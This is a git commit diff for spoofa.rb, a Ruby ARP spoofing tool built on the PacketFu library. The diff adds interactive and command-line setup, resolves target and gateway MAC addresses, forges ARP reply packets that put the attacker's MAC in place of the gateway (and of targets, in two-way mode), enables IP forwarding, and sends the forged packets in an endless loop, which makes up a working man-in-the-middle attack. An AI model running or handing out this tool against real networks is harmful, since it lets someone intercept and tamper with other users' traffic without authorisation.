8460aabe9ee0010887ee90b0514eabc3f0dcecf6
SilverFoxx <VulpiArgenti@gmail.com>
2013-07-27 15:00:31 +1000

    It works! But doesn't look like Ruby

--- spoofa.rb
+++ spoofa.rb
@@ -28,7 +28,7 @@ else # Parse the command-line options
 			options.verbose = v
 		end
 		
-		opts.on("-m", "--smart", "Smart ARPing; attempts to monitor ARP requests from the target(s), and only reply as necessary. If not set, ARP packets are sent continuously.") do |m|
+		opts.on("-m", "--smart", "NOT WORKING YET Smart ARPing; attempts to monitor ARP requests from the target(s), and only reply as necessary. If not set, ARP packets are sent continuously.") do |m|
 			options.smart = m
 		end
 		
@@ -50,7 +50,6 @@ else # Parse the command-line options
 		end
 	end.parse!
 end
-
 #------------------------------------------------------#
 # Assorted methods
 def ip_check(ip)
@@ -63,7 +62,7 @@ end
 
 def target_parse(target)
 	target = target.split(",")
-	@target = []
+	@target = []										# Array of target ip's
 	@target = target.select {|ip| ip_check(ip)} 		# Move single ips to @target
 	target.delete_if {|ip| ip_check(ip)}				# Leaving range(s) in target
 	target.each do |range|								# Separate range(s) into start and end addresses
@@ -72,29 +71,27 @@ def target_parse(target)
 		ip_from 	= IPAddr.new(from)
 		ip_to 		= IPAddr.new(to)
 		(ip_from..ip_to).each { |ip| @target << ip.to_s }	# Enter each value of range into @target 
+		### delete self
 	end
 end
 
 #------------------------------------------------------#
 # Let's set some defaults and variables
 
-defaults = PacketFu::Utils.ifconfig
-
 if interactive
 	@verbose 	= true
-	print "Enter target IP: "
-	target 		= gets.chomp
 	
-	@iface = defaults[:iface] 
+	@defaults = PacketFu::Utils.ifconfig
+	@iface = @defaults[:iface] 
 	print "Default interface appears to be #{@iface}.\nEnter to accept #{@iface}, or type an alternative: "
 	temp = gets.chomp
 	unless temp.empty?
 		@iface = temp
-		defaults = PacketFu::Utils.ifconfig(@iface) # Iface changed, therefore need new defaults
+		@defaults = PacketFu::Utils.ifconfig(@iface) 				# Iface changed, therefore need new defaults
 	end
 	
 	until ip_check(@gateway) do
-		net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Guess gateway by parsing netstat
+		net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } 	# Guess gateway by parsing netstat
 		@gateway = ((net[0]).split)[1] 
 		if ip_check(@gateway)
 			print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
@@ -109,6 +106,22 @@ if interactive
 		end 
 	end
 	
+	var = false
+	until var 
+		print "Spoof target only (1-way), or router as well (2-way)? (1/2): "
+		var = gets.chomp
+		if  var == "2"
+			@two_way
+		elsif var == "1"
+			@two_way = false
+		else
+			var = false
+			puts "Must enter \"1\" or \"2\"."
+			sleep 1
+		end
+	end
+	
+=begin
 	smart = false
 	until smart 
 		print "Are we smart arping? (y/n): "
@@ -123,20 +136,29 @@ if interactive
 			sleep 1
 		end
 	end
+=end
 	
-else # CL mode
+	print "Enter target IP: " ### sanitise input
+	target 		= gets.chomp
+	
+# CL mode	
+else 	
 	@verbose 	= options.verbose
-	@smart 		= options.smart
+	#@smart 	= options.smart
 	@iface 		= options.interface
 	target 		= options.target
 	@gateway	= options.gateway
-
+	@defaults 	= PacketFu::Utils.ifconfig(@iface)
+	
 	if @verbose
+=begin
 		if @smart
 			var1 = "Smart s"
 		else
 			var1 = "S"
 		end
+=end	
+		var1 = "S"
 		if @gateway
 			var2 = "two-way with gateway #{@gateway}."
 		else
@@ -144,19 +166,73 @@ else # CL mode
 		end
 		puts "#{var1}poofing #{target} on #{@iface}, #{var2}"
 	end
+	
+	@two_way = true
+	if !@gateway
+		@two_way = false
+		net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Guess gateway by parsing netstat
+		@gateway = ((net[0]).split)[1]
+	end 
+	unless ip_check(@gateway)
+		print "Unable to verify gateway address. Try again with 2-way spoofing, or interactive mode."
+		sleep 2
+		exit 0
+	end
 end
 
 target_parse(target)
 puts_verbose("\nObtaining mac addresses...")
 @targets_hash = {}
-gateway_mac = PacketFu::Utils::arp(@gateway)
-puts_verbose "Mac of #{@gateway} (gateway) is #{gateway_mac}"
+gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
+puts_verbose "Gateway (#{@gateway}): mac is #{gateway_mac}"
 @target.each do |ip|
-	target_mac = PacketFu::Utils::arp(ip)
+	target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
 	@targets_hash[ip] = target_mac			# Makes hash of target ips => target macs
 	if target_mac
 		puts_verbose "#{ip}: mac is #{target_mac}"
 	else
 		puts_verbose "#{ip}: is down"
 	end
+	@targets_hash.delete_if { |k, v| v.nil? }
 end
+
+#------------------------------------------------------#
+# Make arrays of packets for targets and gateway
+
+	@target_packets  = []
+	@gateway_packets = []
+	@targets_hash.each do |target, target_mac|
+		arp_packet_target 		= PacketFu::ARPPacket.new
+		arp_packet_target.arp_opcode = 2
+		arp_packet_target.eth_saddr = arp_packet_target.arp_saddr_mac = @defaults[:eth_saddr]
+		arp_packet_target.eth_daddr = arp_packet_target.arp_daddr_mac = target_mac
+		arp_packet_target.arp_saddr_ip = @gateway
+	    arp_packet_target.arp_daddr_ip = target
+		
+		@target_packets << arp_packet_target
+	end
+	if @two_way
+		@targets_hash.each do |target, |
+			arp_pkt_gateway 		= PacketFu::ARPPacket.new
+			arp_pkt_gateway.arp_opcode = 2
+			arp_pkt_gateway.eth_saddr = arp_pkt_gateway.arp_saddr_mac = @defaults[:eth_saddr]
+			arp_pkt_gateway.eth_daddr = arp_pkt_gateway.arp_daddr_mac = gateway_mac
+			arp_pkt_gateway.arp_saddr_ip = target
+		    arp_pkt_gateway.arp_daddr_ip = @gateway
+			@gateway_packets  << arp_pkt_gateway
+		end
+	end
+
+	`echo 1 > /proc/sys/net/ipv4/ip_forward`
+	send_packets = true
+	while send_packets
+		while true
+			@target_packets.each do |pkt|
+				pkt.to_w(@iface)
+			end
+			@gateway_packets.each do |pkt|
+				pkt.to_w(@iface)
+			end
+		sleep 2
+		end
+	end
